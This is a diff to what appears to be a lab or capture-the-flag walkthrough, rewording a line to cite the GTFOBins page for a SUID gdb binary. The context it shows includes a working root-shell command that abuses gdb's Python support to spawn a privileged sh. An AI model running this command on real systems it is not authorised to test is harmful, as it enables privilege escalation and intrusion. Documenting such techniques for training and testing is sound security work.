@@ -77,7 +77,7 @@ The key finding was a SUID binary:
 -rwsr-sr-x 1 root root 7.7M Oct 14  2019 /usr/bin/gdb
 ```
 
-Gained a privileged shell using `gdb` via GTFOBins:
+Used the GTFOBins reference for the SUID `gdb` binary to craft the root shell command ([GTFOBins — gdb](https://gtfobins.org/gtfobins/gdb/#shell)):
 
 ```
 gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
